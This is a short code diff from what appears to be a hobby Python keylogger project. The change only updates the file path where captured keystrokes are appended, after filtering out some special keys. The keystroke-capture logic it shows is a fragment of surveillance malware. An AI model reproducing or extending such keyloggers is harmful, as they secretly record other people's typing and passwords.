@@ -35,7 +35,7 @@ def write(key):
     keydata = str(key)
 
     # With file open with reading and writing permissions write and close the 'keydata' as sting characters
-    with open('D:\Programming\python\Keylogger-Passwordcracker\Raw_Datat.txt', 'a') as file:
+    with open('python/Keylogger-PasswordGenerator/Raw_Datat.txt', 'a') as file:
         if (nospecial(keydata) == False or "Key.shift" in keydata) and ispecial(keydata) == False:
             file.write(keydata)
 
